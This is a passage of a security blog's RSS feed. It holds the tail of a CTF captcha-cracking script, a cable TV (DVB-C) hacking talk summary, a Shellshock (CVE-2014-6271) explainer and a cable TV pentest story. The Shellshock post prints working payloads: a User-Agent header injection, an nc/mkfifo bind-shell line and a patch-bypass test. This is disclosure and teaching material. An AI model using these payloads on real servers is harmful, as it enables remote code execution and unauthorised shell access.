#0000BB">y<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">foundletter&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">True&nbsp;</span><span style="color: #007700">and&nbsp;</span><span style="color: #0000BB">inletter&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">False</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">foundletter&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">False<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">y<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;letters</span><span style="color: #007700">.</span><span style="color: #0000BB">append</span><span style="color: #007700">((</span><span style="color: #0000BB">start</span><span style="color: #007700">,</span><span style="color: #0000BB">end</span><span style="color: #007700">))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">inletter</span><span style="color: #007700">=</span><span style="color: #0000BB">False<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;-&#93;&nbsp;Horizontal&nbsp;Position&nbsp;Where&nbsp;letter&nbsp;start&nbsp;and&nbsp;stop&nbsp;\n"&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #007700">print&nbsp;</span><span style="color: #0000BB">letters<br />&nbsp;&nbsp;</span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"\n"<br /><br />&nbsp;&nbsp;</span><span style="color: #0000BB">count&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;</span><span style="color: #007700">for&nbsp;</span><span style="color: #0000BB">letter&nbsp;in&nbsp;letters</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">m&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">.</span><span style="color: #0000BB">md5</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">im3&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">crop</span><span style="color: #007700">((&nbsp;</span><span style="color: #0000BB">letter</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;&nbsp;,&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">letter</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">captcha_filtered</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;&nbsp;))<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#Match&nbsp;current&nbsp;letter&nbsp;with&nbsp;sample&nbsp;data<br />&nbsp;&nbsp;&nbsp;&nbsp;#im3.save("/root/ctf/let/%s.gif"%(m.hexdigest()),quality=95)<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">count&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;base&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">im3</span><span style="color: #007700">.</span><span style="color: #0000BB">convert</span><span style="color: #007700">(</span><span style="color: #DD0000">'L'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#print&nbsp;files_names<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">class&nbsp;</span><span style="color: #0000BB">Fit</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">letter&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">None<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;difference&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;best&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">Fit</span><span style="color: #007700">()<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">letter&nbsp;in&nbsp;files_names</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#print&nbsp;letter<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">current&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">Fit</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">current</span><span style="color: #007700">.</span><span style="color: #0000BB">letter&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">letter<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sample_path&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">letter<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#print&nbsp;sample_path<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">sample&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">Image</span><span style="color: #007700">.</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #0000BB">sample_path</span><span style="color: #007700">).</span><span style="color: #0000BB">convert</span><span style="color: #007700">(</span><span style="color: #DD0000">'L'</span><span style="color: #007700">).</span><span style="color: #0000BB">resize</span><span style="color: #007700">(</span><span style="color: #0000BB">base</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">difference&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ImageChops</span><span style="color: #007700">.</span><span style="color: #0000BB">difference</span><span style="color: #007700">(</span><span style="color: #0000BB">base</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">sample</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">x&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">difference</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">y&nbsp;in&nbsp;range</span><span style="color: #007700">(</span><span style="color: #0000BB">difference</span><span style="color: #007700">.</span><span style="color: #0000BB">size</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">current</span><span style="color: #007700">.</span><span style="color: #0000BB">difference&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">difference</span><span style="color: #007700">.</span><span style="color: #0000BB">getpixel</span><span style="color: #007700">((</span><span style="color: #0000BB">x</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">y</span><span style="color: #007700">))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">not&nbsp;best</span><span style="color: #007700">.</span><span style="color: #0000BB">letter&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">best</span><span style="color: #007700">.</span><span style="color: #0000BB">difference&nbsp;</span><span style="color: #007700">&gt;&nbsp;</span><span style="color: #0000BB">current</span><span style="color: #007700">.</span><span style="color: #0000BB">difference</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">best&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">current<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">#final&nbsp;captcha&nbsp;decoded<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">tmp&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">best</span><span style="color: #007700">.</span><span style="color: #0000BB">letter</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">14</span><span style="color: #007700">:</span><span style="color: #0000BB">15</span><span style="color: #007700">&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">captcha&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">captcha</span><span style="color: #007700">+</span><span style="color: #0000BB">tmp<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style="color: #FF8000">#let&nbsp;us&nbsp;post&nbsp;the&nbsp;captcha&nbsp;to&nbsp;the&nbsp;server&nbsp;along&nbsp;with&nbsp;the&nbsp;session&nbsp;token<br />&nbsp;&nbsp;</span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;Captcha&nbsp;is&nbsp;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">captcha<br />&nbsp;&nbsp;url&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'http://54.165.191.231/verify.php'<br />&nbsp;&nbsp;</span><span style="color: #0000BB">data&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urllib</span><span style="color: #007700">.</span><span style="color: #0000BB">urlencode</span><span style="color: #007700">({</span><span style="color: #DD0000">'solution'&nbsp;</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">captcha</span><span style="color: #007700">.</span><span style="color: #0000BB">strip</span><span style="color: #007700">(),&nbsp;</span><span style="color: #DD0000">'Submit'&nbsp;</span><span style="color: #007700">:&nbsp;</span><span style="color: #DD0000">'Submit'</span><span style="color: #007700">})<br />&nbsp;&nbsp;</span><span style="color: #0000BB">req&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">opener</span><span style="color: #007700">.</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #0000BB">url</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">data</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">response&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">req</span><span style="color: #007700">.</span><span style="color: #0000BB">read</span><span style="color: #007700">()<br />&nbsp;&nbsp;print&nbsp;</span><span style="color: #0000BB">response&nbsp;<br /></span>
</span>
</code></code></div>
</div><u><b>My program had 97% success rate and after 50 successful entries I got the flag.<br />
GitHub Code: <a href="http://Github Above Code" target="_blank">https://github.com/fb1h2s/captcha-cracker<br />
</a></b></u><img src="http://garage4hackers.com/attachment.php?attachmentid=834&amp;d=1421321993" border="0" alt="Name:  ctf_final_uploadn.jpg
Views: 3984
Size:  37.4 KB"  /><br />
<br />
Ref:<a href="http://www.boyter.org/decoding-captchas/" target="_blank">http://www.boyter.org/decoding-captchas/</a></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3103</guid>
		</item>
		<item>
			<title>Pentesting a DVB-C network .Hacking your cable TV Network Part 1</title>
			<link>http://garage4hackers.com/entry.php?b=3098</link>
			<pubDate>Sat, 27 Dec 2014 13:53:31 GMT</pubDate>
			<description><![CDATA[Here is my ekoparty video on hacking cable tv networks . 
 
 http://vimeo.com/113053663 
 
 
DVB-C stands for "Digital Video Broadcasting - Cable"...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Here is my ekoparty video on hacking cable tv networks .<br />
<br />
 
<object class="restrain" type="application/x-shockwave-flash" width="640" height="360" data="//vimeo.com/moogaloop.swf?clip_id=113053663">
	<param name="movie" value="//vimeo.com/moogaloop.swf?clip_id=113053663" />
	<param name="wmode" value="opaque" />
	<!--[if IE 6]>
	<embed width="640" height="360" type="application/x-shockwave-flash" src="//vimeo.com/moogaloop.swf?clip_id=113053663" />
	<![endif]--></object>
<br />
<br />
<br />
DVB-C stands for &quot;Digital Video Broadcasting - Cable&quot; and it is the DVB European consortium standard for the broadcast transmission of digital television over cable. This system transmits an MPEG-2 or MPEG-4 family digital audio/digital video stream, using a QAM modulation with channel coding. The standard was first published by the ETSI in 1994, and subsequently became the most widely used transmission system for digital cable television in Europe. source: <a href="http://en.wikipedia.org/wiki/DVB-C" target="_blank">http://en.wikipedia.org/wiki/DVB-C</a> <br />
<br />
We been working with a Cable TV service provide for the past 1 year. With digital cable tv implementations, the transmitted MPEG streams are encrypted/scrambled and users needs a setup box to de-scramble/decode the streams. Also service providers can shut down a device remotely if (no payment) or even display a custom text message that will scroll on top of a video. This is made possible by Middleware servers or applications servers that are used to manage the DVM networks. <br />
<br />
So in our talks we cover the various attacks we can do on DVB-C infrastructure. That will include the following topics. <br />
1) Security Vulnerabilities in DVB-C middleware servers. [Hijacking a TV stream] <br />
2) Implementation bugs in DVB-C network protocol .[Man in the Middle Attacks]<br />
 3) Fuzzing setup boxes via MPEG streams. [Shutting down Setup boxes] <br />
4) Demo taking over your Cable TV BroadCasting.</blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3098</guid>
		</item>
		<item>
			<title>Everything you need to know about CVE-2014-6271</title>
			<link>http://garage4hackers.com/entry.php?b=3087</link>
			<pubDate>Thu, 25 Sep 2014 00:15:21 GMT</pubDate>
			<description><![CDATA[_*FAQ:: 
*_ 
 
 
 
HTML: 
--------- 
Code execution possible on CGI Web Applications:  	Yes [Critical ] 
Code execution possible on SSH              ...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><u><b>FAQ::<br />
</b></u><br />
<br />
<div style="text-align: left;"><br />
<div class="bbcode_container">
	<div class="bbcode_description">HTML Code:</div>
	<pre class="bbcode_code" style="height:6*12px};">Code execution possible on CGI Web Applications:  	Yes &#91;Critical &#93;
Code execution possible on SSH                 : 	       Yes &#91;Not critical or is based on architecture &#93;
Working Payload for getting reverse Shell Available:      Yes
Is the Current patch complete:                                    No</pre>
</div><u><b>Where was the Bug:<br />
</b></u><br />
Bash supports exporting not just shell variables, but also shell functions to other bash instances, via the process environment to (indirect) child processes. <br />
<br />
So with Bash you can export function definitions to a sub-shell. Exporting a function using export -f creates an environment variable with the function body<br />
<br />
<u><b>Example: <br />
</b></u><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">fb1$ fn(){ echo &quot;sasi&quot;; }
fb1$ export -f fn
fb1$ sh -c printenv\ fn
() {  echo &quot;sasi&quot;
}</pre>
</div>So that is how bash function variables are written and exported. Here an important point to remember is bash consider Environment variable starting with  () { as a function. <br />
<br />
Ex: function() { echo&quot;I am a function&quot; }<br />
<br />
<u><b>Applications of this feature:<br />
</b></u><br />
Example following ssh script:<br />
 <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">#!/bin/bash
importantfunction() { echo &quot; long important function&quot;;}; 

ssh user@host &quot;$(declare -pf importantfunction); importantfunction&quot;</pre>
</div>Now the above SSH session would have successfully imported the function importantfunction() &quot;remember its only imported and never executed unless called explicitly&quot; . Now the function could be used on the current session. <br />
<br />
<br />
<u><b>The vulnerability<br />
</b></u><br />
<br />
The vulnerability occurs because bash does not stop after processing the function definition. It continues to parse and execute shell commands following the function definition.<br />
<br />
Reference: <a href="http://seclists.org/oss-sec/2014/q3/650" target="_blank">http://seclists.org/oss-sec/2014/q3/650</a><br />
<br />
Example:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">fb1$ VAR=() { echo &quot;; }; /bin/ls

VAR=() { echo &quot;; }; &lt;-- function ends
 /bin/ls   &lt;-- here /bin/ls would get executed executed</pre>
</div> So basically the payload to test if your bash is vulnerable would be obviously as following.<br />
 <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">fb1$   env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a vulnerable&quot;</pre>
</div><br />
<u><b>Exploitation</b></u>:<br />
<br />
There are a number of places this could be exploited .<br />
<br />
1) SSH                &lt;-- Criticality varies [Tested ]<br />
2) CGI Web Apps &lt;-- High Criticality   [Tested ]<br />
3) DHCP             &lt;--                    [Not tested] <br />
4) CUPS              &lt;--                   [Not tested by me]<br />
5) sudo               &lt;--                   [Not tested ]<br />
<br />
<b><u>Exploiting HTTP CGI Web Applications:<br />
</u></b><br />
<br />
CGI parses certain HTTP paramaters as environment variables.<br />
<br />
ref:<a href="http://www.cgi101.com/book/ch3/text.html" target="_blank">http://www.cgi101.com/book/ch3/text.html</a><br />
<br />
For example ,<br />
HTTP_COOKIE	The visitor's cookie, if one is set<br />
HTTP_HOST	The hostname of the page being attempted<br />
HTTP_REFERER	The URL of the page that called your program<br />
HTTP_USER_AGENT	The browser type of the visitor<br />
<br />
<br />
These values would be an interesting attack surface. So an attack uses the following payload to compromise the web application.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:48px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">GET&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">cgi</span><span style="color: #007700">-</span><span style="color: #0000BB">bin</span><span style="color: #007700">/</span><span style="color: #0000BB">script&nbsp;HTTP</span><span style="color: #007700">/</span><span style="color: #0000BB">1.1<br />User</span><span style="color: #007700">-</span><span style="color: #0000BB">Agent</span><span style="color: #007700">:&nbsp;()&nbsp;{&nbsp;:;};&nbsp;echo&nbsp;</span><span style="color: #0000BB">aa</span><span style="color: #007700">&gt;/</span><span style="color: #0000BB">tmp</span><span style="color: #007700">/</span><span style="color: #0000BB">hacked&nbsp;<br /></span>
</span>
</code></code></div>
</div>Here Bash when parsing the environment variables would now parse User-Agent () as a function name and rest the function definition and then the payload.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:84px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">User</span><span style="color: #007700">-</span><span style="color: #0000BB">Agent</span><span style="color: #007700">:&nbsp;()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;--&nbsp;</span><span style="color: #0000BB">Treated&nbsp;</span><span style="color: #007700">as&nbsp;function<br /><br />{&nbsp;:;};&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;--&nbsp;Function&nbsp;</span><span style="color: #0000BB">Definition&nbsp;<br /><br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #0000BB">aa</span><span style="color: #007700">&gt;/</span><span style="color: #0000BB">tmp</span><span style="color: #007700">/</span><span style="color: #0000BB">hacked&nbsp;&nbsp;</span><span style="color: #007700">&lt;--&nbsp;</span><span style="color: #0000BB">Extra&nbsp;payload&nbsp;<br /></span>
</span>
</code></code></div>
</div><img src="http://garage4hackers.com/attachment.php?attachmentid=791&amp;d=1411603772" border="0" alt="Name:  Screen Shot 2014-09-25 at 2.33.27 am.jpg
Views: 7525
Size:  21.7 KB"  style="float: CONFIG" /><br />
<br />
<br />
<br />
<u><b>Payload:<br />
</b></u><br />
Now attackers can utilise a Bind shell payload as put-up here:<br />
ref:<a href="http://pastebin.com/dEYQndKG" target="_blank">http://pastebin.com/dEYQndKG</a><br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f'</pre>
</div><br />
<u><b>Current Patch:<br />
</b></u><br />
Current patch is broken:<br />
<a href="https://twitter.com/taviso/status/514887394294652929" target="_blank">https://twitter.com/taviso/status/514887394294652929</a><br />
<br />
We were able to test a bypass for the patch and it worked <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">env lol='() { (nothing)=&gt;\' sh -c &quot;echo date&quot;; echo “vulnerable&quot;</pre>
</div>So current patch cannot be trusted. But at the same time based on initial analysis it can provide protection against Remote attacks on CGI applications.<br />
<br />
<u><b>Exploiting SSH:<br />
</b></u><br />
<br />
If an attacker does not have an SSH account this exploit would not work. That is the reason why I categorized this as less vulnerable. But certain environments it is possible to have a shell user to have bypass shell restrictions. One good example is over here, Gitlab-shell is affected by Bash CVE-2014-6271<br />
<a href="https://about.gitlab.com/2014/09/24/gitlab-shell-and-bash-cve-2014-6271/" target="_blank">https://about.gitlab.com/2014/09/24/...cve-2014-6271/</a><br />
<br />
It is possible to inject shell parameters into an SSH session.<br />
<br />
<br />
<br />
<b><u>Few reference: <br />
</u></b><font size="4">Bash bug write-up with Snort and Suricata signatures <a href="http://t.co/dGnevpgU4S" target="_blank">http://t.co/dGnevpgU4S</a> by @stevenadair @Volexity #DFIR<br />
Fix Bash remote vulnerability CVE-2014-6271 on your Mac - <a href="http://t.co/bYQCdiTXJd" target="_blank">http://t.co/bYQCdiTXJd</a><br />
How do I recompile Bash to avoid the remote exploit CVE-2014-6271 and CVE-2014-7169? <a href="http://t.co/ozJG0SpVB2" target="_blank">http://t.co/ozJG0SpVB2</a><br />
CVE-2014-6271 / Shellshock &amp; How to handle all the shells! ;) <a href="http://www.clevcode.org/cve-2014-6271-shellshock/" target="_blank">http://www.clevcode.org/cve-2014-6271-shellshock/</a><br />
Updating CVE-2014-6271 on OSX and Linux <a href="http://qiita.com/syui/items/809c1cd8ed57c8cdb055" target="_blank">http://qiita.com/syui/items/809c1cd8ed57c8cdb055</a><br />
Busybox also vulnerable to CVE-2014-6271 in Android Terminal Emulator &gt;:( (CM11 shown) <a href="https://twitter.com/tehowe/status/514859890662440961/photo/1" target="_blank">https://twitter.com/tehowe/status/51...440961/photo/1</a><br />
<br />
</font><br />
</div></blockquote>

]]></content:encoded>
			<dc:creator>fb1h2s</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3087</guid>
		</item>
		<item>
			<title>Low hanging Web Application bugs in Digital Cable :Hacking Cable TV Networks Part 1</title>
			<link>http://garage4hackers.com/entry.php?b=3073</link>
			<pubDate>Tue, 05 Aug 2014 22:00:41 GMT</pubDate>
			<description>*_Hacking your cable TV Networks: Low Hanging Web Application bugs in Digital Cable TV. 
_* 
 
Check out previous blog...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><b><u>Hacking your cable TV Networks: Low Hanging Web Application bugs in Digital Cable TV.<br />
</u></b><br />
<br />
Check out previous blog :<a href="http://www.garage4hackers.com/entry.php?b=2830" target="_blank">http://www.garage4hackers.com/entry.php?b=2830</a><br />
Hacking Your Cable TV Networks : HITB Security Conference Part 0. <br />
<br />
<br />
We did two presentations on the security issues in Digital Cable TV network back in February at Nullcon[Goa] and another at HITB [Amsterdam ] . We disclosed few of the many security issues we reported to a large cable network operator in India. The main highlight of the talk was that we [<a href="https://twitter.com/fb1h2s" target="_blank">Me</a> &amp; <a href="https://twitter.com/skeptic_fx" target="_blank">Ahamed Nafeez</a> ] did the presentations wearing a traditional dress[lungi,mundu] used by the locals in <a href="http://www.youtube.com/watch?v=SLQmQwvJU78" target="_blank">Kerala</a> . This was to appreciate all the help the natives did while conducting the research. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=726&amp;d=1407276235" border="0" alt="Name:  combine_images3.jpg
Views: 9342
Size:  26.4 KB"  style="float: CONFIG" /><br />
<b><u><br />
Presentation material:<br />
</u></b><br />
The slides are available here: <a href="http://haxpo.nl/wp-content/uploads/2014/02/D1T1-Hacking-Your-Cable-TV-Network-Die-Hard-Style.pptx" target="_blank">http://haxpo.nl/wp-content/uploads/2...ard-Style.pptx</a>.<br />
But I would be writing a series of blogs and would explain the bugs in detail here. <br />
<br />
Instead of following the same pattern I used for my talk [Just explaining the bugs]. I think it would be fun to share with you the adventures we had while doing the research. If you are only interested in the bugs just head to bug section, else read on. <br />
<br />
It is hard to find any Hands on cable TV security materials on the internet. This is mainly because the infrastructure used by the cable operators are not easily available for every researcher. In our case we were lucky . From November 2013 I was working with one of the largest Cable TV networks in India who provides service to nearly 1 Million users. I agreed to a contract where we would do free security audits for the Cable operators infrastructure and in return they would allow me to publish my finds in any conference of my choice  . And that was a sweet deal for me . I come from an <a href="http://in.linkedin.com/in/fb1h2s" target="_blank">application security background</a>. And I had no clue about Digital cable networks an year back. So in the first blog post I would explain how  I cracked the deal with the Cable Operators to audit their Infrastructure.<br />
<br />
<br />
<u><b>Cracking the Deal:Meeting with the Chief Technical Officer of the Cable Company<br />
</b></u><br />
Unlike Internet where information is viewed with suspicion and misinformation can be quickly vetted through other sources, television is a one-to-many medium where there’s no quick way to identify a false broadcast. If someone hacks into a TV news stream and publishes a news stating that a riot has happened in the nearby city, then that could create a lot of panic in a country like India. <br />
Example Source:  <a href="http://www.politico.com/morningcybersecurity/0814/morningcybersecurity14888.html" target="_blank">Hackers took control of TV feeds in Wenzhou China and streamed anti-communist slogans to millions of viewers.</a> .<br />
<br />
This was the main punch line I used when trying to convince the CTO why to do a Penetration testing for their infrastructure. Since he has not seen any real world attacks on his infrastructure , he was not that convinced to give me the project. But in the end he asked me if I could find any issues from outside, sort of like a black box testing. And If I could find something serious in 2 week he would consider giving me an opportunity. <br />
<br />
<b><u>Web Application bugs in Digital Cable TV :<br />
</u></b><br />
<br />
I have two weeks time and I need to find something quick. I started doing my homework and I learned one thing. There are nearly 1 million users for this service provider. And there are about 2000-3000 local cable operators, the local vendors who distributes the service to individual localities. All these 2000+ cable operators need to have some sort of application where they register their locality users, manages their billing operations etc. And there need to be some sort of centralized application to perform this operation. With some awesome google hacking techniques we were able to locate their centralized billing application aka Middleware server on the Internet  [Woot Woot].<br />
<br />
<u><b>Bug 1: Code execution on Billing Server<br />
</b></u><br />
In not much time I was able to Hijack the Middleware server :). A small misconfiguration on their webserver lead to this hijack[ I am not allowed to talk about it]. What you see listed in the screenshot are all the connected Setup-box users who are clients to a particular local cable operator. If you notice those red buttons on left. Those could be used to remotely shutdown users cable service in case of a missing payment or something .  This was more than enough to explain the criticality but I wanted to find more bugs so that it would be convincing. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=723&amp;d=1407274915" border="0" alt="Name:  Screen Shot 2014-08-06 at 3.01.18 am.jpg
Views: 19416
Size:  23.3 KB"  style="float: CONFIG" /><br />
<br />
<u><b>Bug 2 :Setup Box Hijack [STB]<br />
</b></u><br />
The above web application allowed one operator to transfer STB to another operator. So for example if a user rahul from city Delhi relocates to city Agra. Then user rahul could get his STB unregistered from the local operator [D] at Delhi and get it reassigned to operator [A ] at Agra and continue using the STB and cable service. <br />
 <br />
In the web application there is an option that lists all Existing local operators .Now the transfer takes place on basis of an access key. Operator A need to notify Operator B about the transfer and share his access key to operator B. This Access key implementation was flawed. <br />
<br />
<u>The pseudo code was some what similar:<br />
</u><br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:144px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">$<br /></span><span style="color: #0000BB">$apikey&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"select&nbsp;api_key&nbsp;from&nbsp;apis&nbsp;where&nbsp;username=.'mysql_escape(</span><span style="color: #0000BB">$username</span><span style="color: #DD0000">)'"</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$authenticated&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strcmp</span><span style="color: #007700">(</span><span style="color: #0000BB">$apikey</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'key'</span><span style="color: #007700">&#93;);<br />if&nbsp;(</span><span style="color: #0000BB">$authenticated&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">)&nbsp;{<br />print&nbsp;</span><span style="color: 